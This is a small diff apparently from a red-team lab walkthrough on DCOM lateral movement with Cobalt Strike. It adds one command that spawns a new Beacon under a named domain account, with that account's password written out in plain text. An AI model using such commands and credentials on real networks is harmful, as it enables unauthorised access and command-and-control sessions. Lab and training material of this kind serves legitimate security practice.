@@ -12,8 +12,9 @@ DCOM lateral movement is not built into Cobalt Strike. Furthermore, DCOM does no
 Please spawn a new Beacon using the following command (if your listener is called something other than HTTPS-SHORT, please replace with the name of your listener (can be tab completed)) 
 
 ```markdown
-
+spawnas draconem\Giulio.Stanion d8PEZ#$UM6Vs!h5j HTTPS
 ```
+
 ## Exploitation 
 
 ```markdown
